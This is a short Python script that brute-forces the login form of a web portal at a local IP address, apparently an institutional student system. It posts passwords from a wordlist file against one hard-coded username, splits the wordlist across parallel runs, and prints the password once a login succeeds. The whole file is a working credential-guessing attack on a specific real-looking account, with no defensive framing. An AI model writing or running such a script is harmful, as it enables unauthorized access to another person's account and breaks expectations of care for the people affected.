import requests, time, pyautogui as p

t_no = int(input())
lower = t_no * 17475
upper = (t_no+1) * 17475

s = requests.Session()
f = open('rpass.txt')
passwd = f.readlines()

print('started...')
start = time.perf_counter()

for i in range(lower,upper):
    payload = {
        'username': '21881A05Q5',
        'password': passwd[i].strip(),
        'submit': 'SignIn'
    }

    r = s.post('http://192.168.0.141/vardhaman/', data=payload)

    if b'q=' in r.content:
        'Not successful'
    else:
        print(f'\nPassword = {payload["password"]}\n')
        p.press('win')
        break

f.close()
end=time.perf_counter()
print(end-start)
